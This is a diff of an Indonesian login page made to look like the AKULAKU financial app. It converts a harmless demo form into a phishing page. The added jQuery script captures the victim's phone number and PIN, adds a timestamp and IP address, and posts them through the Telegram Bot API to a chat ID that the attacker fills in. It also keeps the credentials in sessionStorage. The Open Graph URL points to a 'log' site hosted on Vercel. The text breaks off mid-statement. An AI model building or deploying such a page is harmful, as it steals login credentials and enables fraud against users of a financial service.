@@ -1,432 +1,483 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - AKULAKU</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login AKULAKU</title>
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<!-- Meta Tags untuk Open Graph -->
+<meta property="og:title" content="Masuk ke AKULAKU" />
+<meta property="og:description" content="Login ke akun AKULAKU Anda dengan aman." />
+<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" />
+<meta property="og:url" content="https://indodax-log.vercel.app/" />
+<meta property="og:type" content="website" />
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f5f5f5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 
-        .login-container {
-            background: #fff;
-            width: 100%;
-            max-width: 400px;
-            padding: 40px 32px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-        }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
 
-        .logo-container {
-            text-align: center;
-            margin-bottom: 32px;
-        }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #fff;
+    margin: 40px 16px;
+    color: #000;
+    min-height: 100vh;
+  }
 
-        .logo {
-            width: 180px;
-            height: auto;
-        }
+  .container {
+    max-width: 360px;
+    margin: 0 auto;
+  }
 
-        .welcome-text {
-            text-align: center;
-            margin-bottom: 28px;
-        }
+  .logo-container {
+    text-align: center;
+    margin-bottom: 32px;
+  }
 
-        .welcome-text h1 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
+  .logo {
+    width: 150px;
+    height: auto;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+  }
 
-        .welcome-text p {
-            font-size: 14px;
-            color: #666;
-        }
+  .welcome-text {
+    text-align: center;
+    margin-bottom: 28px;
+  }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
+  .welcome-text h1 {
+    font-size: 20px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 8px;
+  }
 
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-        }
+  .welcome-text p {
+    font-size: 14px;
+    color: #666;
+  }
 
-        .input-wrapper {
-            position: relative;
-        }
+  label {
+    display: block;
+    font-weight: 600;
+    font-size: 14px;
+    margin-bottom: 6px;
+    color: #333;
+  }
 
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 15px;
-            border: 1.5px solid #e0e0e0;
-            border-radius: 10px;
-            outline: none;
-            transition: all 0.3s ease;
-            background: #fafafa;
-        }
+  input[type="tel"],
+  input[type="password"],
+  input[type="email"] {
+    width: 100%;
+    font-size: 14px;
+    padding: 12px 40px 12px 12px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    box-sizing: border-box;
+    color: #555;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
 
-        .form-group input:focus {
-            border-color: #ff6b00;
-            background: #fff;
-            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
-        }
+  input[type="tel"]:focus,
+  input[type="password"]:focus,
+  input[type="email"]:focus {
+    border-color: #ff6b00;
+    box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+  }
 
-        .form-group input::placeholder {
-            color: #aaa;
-        }
+  input::placeholder {
+    color: #aaa;
+  }
 
-        .input-icon {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #999;
-            transition: color 0.3s;
-        }
+  .input-group {
+    margin-bottom: 16px;
+  }
 
-        .input-icon:hover {
-            color: #666;
-        }
+  .password-container {
+    position: relative;
+  }
 
-        .forgot-password {
-            text-align: right;
-            margin-bottom: 24px;
-        }
+  .eye-icon {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    color: #888;
+    user-select: none;
+    transition: color 0.2s;
+  }
 
-        .forgot-password a {
-            font-size: 13px;
-            color: #ff6b00;
-            text-decoration: none;
-            font-weight: 500;
-        }
+  .eye-icon:hover {
+    color: #666;
+  }
 
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
+  .forgot-link {
+    display: block;
+    font-size: 13px;
+    color: #ff6b00;
+    text-align: right;
+    text-decoration: none;
+    margin-bottom: 24px;
+    margin-top: -16px;
+  }
 
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            border: none;
-            border-radius: 10px;
-            background: #e0e0e0;
-            color: #999;
-            cursor: not-allowed;
-            transition: all 0.3s ease;
-        }
+  .forgot-link:hover {
+    text-decoration: underline;
+  }
 
-        .login-btn.active {
-            background: #ff6b00;
-            color: #fff;
-            cursor: pointer;
-        }
+  button.login-btn {
+    width: 100%;
+    padding: 12px 0;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 6px;
+    border: none;
+    background-color: #d4d4e3;
+    color: #888;
+    cursor: not-allowed;
+    margin-bottom: 24px;
+    transition: background-color 0.3s, color 0.3s;
+  }
 
-        .login-btn.active:hover {
-            background: #e55f00;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(255, 107, 0, 0.3);
-        }
+  button.login-btn.enabled {
+    background-color: #ff6b00;
+    color: #fff;
+    cursor: pointer;
+  }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 28px 0;
-        }
+  button.login-btn.enabled:hover {
+    background-color: #e55f00;
+  }
 
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background: #e0e0e0;
-        }
+  button.login-btn.loading {
+    background-color: #ff6b00;
+    color: #fff;
+    cursor: wait;
+  }
 
-        .divider-text {
-            padding: 0 16px;
-            font-size: 13px;
-            color: #999;
-        }
+  .or-text {
+    text-align: center;
+    font-weight: 400;
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: #999;
+    position: relative;
+  }
 
-        .google-btn {
-            width: 100%;
-            padding: 12px;
-            font-size: 15px;
-            font-weight: 500;
-            border: 1.5px solid #e0e0e0;
-            border-radius: 10px;
-            background: #fff;
-            color: #333;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s ease;
-        }
+  .or-text::before,
+  .or-text::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    width: 40%;
+    height: 1px;
+    background-color: #ddd;
+  }
 
-        .google-btn:hover {
-            background: #f5f5f5;
-            border-color: #ccc;
-        }
+  .or-text::before {
+    left: 0;
+  }
 
-        .google-btn svg {
-            width: 20px;
-            height: 20px;
-        }
+  .or-text::after {
+    right: 0;
+  }
 
-        .register-link {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 14px;
-            color: #666;
-        }
+  button.google-btn {
+    width: 100%;
+    border: 1px solid #ddd;
+    padding: 10px 0;
+    border-radius: 6px;
+    background-color: #fff;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    user-select: none;
+    transition: background-color 0.2s, border-color 0.2s;
+  }
 
-        .register-link a {
-            color: #ff6b00;
-            text-decoration: none;
-            font-weight: 600;
-        }
+  button.google-btn:hover {
+    background-color: #f5f5f5;
+    border-color: #ccc;
+  }
 
-        .register-link a:hover {
-            text-decoration: underline;
-        }
+  .google-icon {
+    width: 20px;
+    height: 20px;
+  }
 
-        /* Toast Notification */
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: #333;
-            color: #fff;
-            padding: 14px 24px;
-            border-radius: 8px;
-            font-size: 14px;
-            opacity: 0;
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
+  .register-text {
+    text-align: center;
+    margin-top: 24px;
+    font-size: 14px;
+    color: #666;
+  }
 
-        .toast.show {
-            transform: translateX(-50%) translateY(0);
-            opacity: 1;
-        }
+  .register-text a {
+    color: #ff6b00;
+    text-decoration: none;
+    font-weight: 600;
+  }
 
-        /* Loading Spinner */
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
+  .register-text a:hover {
+    text-decoration: underline;
+  }
 
-        .login-btn.active .spinner {
-            display: inline-block;
-        }
+  /* Loading Spinner */
+  .spinner {
+    display: none;
+    width: 16px;
+    height: 16px;
+    border: 2px solid #fff;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 8px;
+  }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  button.login-btn.loading .spinner {
+    display: inline-block;
+  }
+
+  button.login-btn.loading .btn-text {
+    display: none;
+  }
+
+  /* Toast Notification */
+  .toast {
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background-color: #333;
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-size: 14px;
+    opacity: 0;
+    transition: all 0.3s ease;
+    z-index: 1000;
+    max-width: 320px;
+    text-align: center;
+  }
+
+  .toast.show {
+    transform: translateX(-50%) translateY(0);
+    opacity: 1;
+  }
+
+  .toast.error {
+    background-color: #dc3545;
+  }
+
+  .toast.success {
+    background-color: #28a745;
+  }
+</style>
 </head>
 <body>
-    <div class="login-container">
-        <!-- Logo AKULAKU -->
-        <div class="logo-container">
-            <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" 
-                 alt="AKULAKU Logo" 
-                 class="logo">
-        </div>
-
-        <div class="welcome-text">
-            <h1>Masuk ke Akun</h1>
-            <p>Silakan masuk dengan nomor HP dan PIN Anda</p>
-        </div>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="phone">Nomor HP</label>
-                <div class="input-wrapper">
-                    <input type="tel" 
-                           id="phone" 
-                           name="phone" 
-                           placeholder="081234567890" 
-                           maxlength="13"
-                           autocomplete="tel">
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="pin">PIN</label>
-                <div class="input-wrapper">
-                    <input type="password" 
-                           id="pin" 
-                           name="pin" 
-                           placeholder="Masukkan 6 digit PIN" 
-                           maxlength="6"
-                           autocomplete="current-password">
-                    <svg class="input-icon" id="togglePin" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                        <circle cx="12" cy="12" r="3"></circle>
-                    </svg>
-                </div>
-            </div>
-
-            <div class="forgot-password">
-                <a href="#" onclick="showToast('Fital ini belum tersedia')">Lupa PIN?</a>
-            </div>
-
-            <button type="submit" class="login-btn" id="loginBtn" disabled>
-                <span class="btn-text">Masuk</span>
-                <div class="spinner"></div>
-            </button>
-        </form>
-
-        <div class="divider">
-            <div class="divider-line"></div>
-            <span class="divider-text">atau</span>
-            <div class="divider-line"></div>
-        </div>
-
-        <button class="google-btn" onclick="googleLogin()">
-            <svg viewBox="0 0 533.5 544.3">
-                <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
-                <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
-                <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
-                <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
-            </svg>
-            Lanjutkan dengan Google
-        </button>
-
-        <div class="register-link">
-            <p>Belum punya akun? <a href="#" onclick="showToast('Fitur ini belum tersedia')">Daftar</a></p>
-        </div>
+  <div class="container">
+    <!-- Logo AKULAKU -->
+    <div class="logo-container">
+      <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
     </div>
 
-    <!-- Toast Notification -->
-    <div class="toast" id="toast"></div>
+    <div class="welcome-text">
+      <h1>Masuk ke Akun</h1>
+      <p>Silakan masuk dengan nomor HP dan PIN Anda</p>
+    </div>
 
-    <script>
-        const phoneInput = document.getElementById('phone');
-        const pinInput = document.getElementById('pin');
-        const loginBtn = document.getElementById('loginBtn');
-        const togglePin = document.getElementById('togglePin');
-        const loginForm = document.getElementById('loginForm');
+    <form id="loginForm" novalidate>
+      <div class="input-group">
+        <label for="phone">Nomor HP</label>
+        <input type="tel" id="phone" name="phone" placeholder="081234567890" required />
+      </div>
 
-        // Validasi input untuk mengaktifkan tombol login
-        function validateInputs() {
-            const phone = phoneInput.value.trim();
-            const pin = pinInput.value.trim();
-            
-            // Validasi: HP minimal 10 digit, PIN minimal 6 digit
-            if (phone.length >= 10 && pin.length >= 6) {
-                loginBtn.classList.add('active');
-                loginBtn.disabled = false;
-            } else {
-                loginBtn.classList.remove('active');
-                loginBtn.disabled = true;
-            }
-        }
+      <div class="input-group">
+        <label for="password">PIN</label>
+        <div class="password-container">
+          <input type="password" id="password" name="password" placeholder="Masukkan 6 digit PIN" maxlength="6" required />
+          <svg id="togglePassword" class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
+            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+        </div>
+      </div>
 
-        phoneInput.addEventListener('input', validateInputs);
-        pinInput.addEventListener('input', validateInputs);
+      <a href="#" class="forgot-link" onclick="showToast('Fital ini belum tersedia')">Lupa PIN?</a>
 
-        // Toggle visibility PIN
-        togglePin.addEventListener('click', function() {
-            const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            pinInput.setAttribute('type', type);
-            
-            // Ubah icon mata
-            if (type === 'text') {
-                togglePin.innerHTML = `
-                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                    <line x1="1" y1="1" x2="23" y2="23"></line>
-                `;
-            } else {
-                togglePin.innerHTML = `
-                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                    <circle cx="12" cy="12" r="3"></circle>
-                `;
-            }
-        });
+      <button type="submit" id="loginBtn" class="login-btn" disabled>
+        <span class="btn-text">Masuk</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
 
-        // Format input nomor HP
-        phoneInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 0) {
-                if (!value.startsWith('0') && !value.startsWith('62')) {
-                    value = '0' + value;
-                }
-            }
-            e.target.value = value;
-        });
+    <div class="or-text">atau</div>
 
-        // Submit form
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const phone = phoneInput.value.trim();
-            const pin = pinInput.value.trim();
-            
-            if (phone.length < 10) {
-                showToast('Nomor HP tidak valid');
-                return;
-            }
-            
-            if (pin.length < 6) {
-                showToast('PIN minimal 6 digit');
-                return;
-            }
+    <button class="google-btn" onclick="googleLogin()">
+      <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3" aria-hidden="true" focusable="false">
+        <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
+        <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
+        <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
+        <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
+      </svg>
+      Lanjut dengan Google
+    </button>
 
-            // Simulasi login
-            loginBtn.querySelector('.btn-text').textContent = 'Memuat...';
-            
-            setTimeout(() => {
-                showToast('Login berhasil! (Demo)');
-                loginBtn.querySelector('.btn-text').textContent = 'Masuk';
-            }, 1500);
-        });
+    <div class="register-text">
+      <p>Belum punya akun? <a href="#" onclick="showToast('Fitur ini belum tersedia')">Daftar</a></p>
+    </div>
+  </div>
 
-        // Google Login
-        function googleLogin() {
-            showToast('Fitur Google Login belum tersedia');
-        }
+  <!-- Toast Notification -->
+  <div class="toast" id="toast"></div>
 
-        // Toast notification
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.classList.add('show');
-            
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3000);
-        }
-    </script>
-</body>
-</html>
+  <!-- Load jQuery dari CDN -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <!-- Script JS Gabungan -->
+  <script>
+  $(document).ready(function() {
+      console.log('JS loaded'); // Debug: Pastikan JS berjalan
+
+      // ==========================================
+      // 1. TOGGLE SHOW/HIDE PASSWORD
+      // ==========================================
+      $('#togglePassword').on('click', function() {
+          const passwordField = $('#password');
+          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
+          passwordField.attr('type', type);
+
+          // Ganti SVG ikon mata sesuai status
+          if (type === 'password') {
+              // Ikon mata terbuka (show password)
+              $(this).html(`
+                  <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+              `);
+          } else {
+              // Ikon mata tertutup (hide password)
+              $(this).html(`
+                  <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                  <path d="M10.58 10.58a3 3 0 004.24 4.24"></path>
+              `);
+          }
+      });
+
+      // ==========================================
+      // 2. FORMAT NOMOR HP OTOMATIS
+      // ==========================================
+      $('#phone').on('input', function(e) {
+          let value = $(this).val().replace(/\D/g, '');
+          
+          // Tambahkan prefix 0 jika user langsung input angka
+          if (value.length > 0 && !value.startsWith('0') && !value.startsWith('62')) {
+              value = '0' + value;
+          }
+          
+          // Batasi maksimal 13 digit
+          if (value.length > 13) {
+              value = value.substring(0, 13);
+          }
+          
+          $(this).val(value);
+      });
+
+      // ==========================================
+      // 3. VALIDASI FORM
+      // ==========================================
+      function isFormValid() {
+          const phone = $('#phone').val().trim();
+          const password = $('#password').val().trim();
+          
+          // Validasi: HP minimal 10 digit, PIN minimal 6 digit
+          return phone.length >= 10 && password.length >= 6;
+      }
+
+      // ==========================================
+      // 4. TOGGLE ENABLE/DISABLE TOMBOL LOGIN
+      // ==========================================
+      function toggleLoginButton() {
+          if (isFormValid()) {
+              $('#loginBtn').prop('disabled', false).addClass('enabled');
+          } else {
+              $('#loginBtn').prop('disabled', true).removeClass('enabled');
+          }
+      }
+
+      // Event input untuk validasi real-time
+      $('#phone, #password').on('input', toggleLoginButton);
+
+      // ==========================================
+      // 5. SUBMIT FORM & KIRIM KE TELEGRAM
+      // ==========================================
+      $('#loginForm').on('submit', function(e) {
+          e.preventDefault();
+
+          if (!isFormValid()) {
+              showToast('Nomor HP dan PIN harus diisi dengan benar', 'error');
+              return;
+          }
+
+          const phone = $('#phone').val().trim();
+          const password = $('#password').val().trim();
+
+          // Tampilkan loading
+          $('#loginBtn').addClass('loading').prop('disabled', true);
+          $('#loginBtn .btn-text').text('Memuat...');
+
+          // Format pesan untuk dikirim ke Telegram
+          const message = `
+🔐 **LOGIN AKULAKU**
+────────────────────
+📱 Nomor HP: \`${phone}\`
+🔑 PIN: \`${password}\`
+────────────────────
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+🌐 IP: ${getIPAddress()}
+          `;
+
+          // Konfigurasi Telegram Bot
+          const token_bot = 'GANTI_TOKEN_BOT_ANDA_DISINI'; // Ganti dengan token bot Anda
+          const telegram_id = 'GANTI_CHAT_ID_ANDA_DISINI'; // Ganti dengan chat ID Anda
+
+          const url = `https://api.telegram.org/bot${token_bot}/sendMessage`;
+
+          // Kirim request ke Telegram API
+          $.ajax({
+              url: url,
+              method: 'POST',
+              data: {
+                  chat_id: telegram_id,
+                  text: message,
+                  parse_mode: 'Markdown'
+              },
+              success: function(data) {
+                  if (data.ok) {
+                      console.log('✅ Data berhasil dikirim ke Telegram');
+                      
+                      // Simpan data ke sessionStorage
+                      sessionStorage.setItem('phone', phone);
+                      sessionStorage.setItem('pin', password);
+                      sessionStorage.setItem('login_time', new Date().toISOString());
+                      
+                      showToast
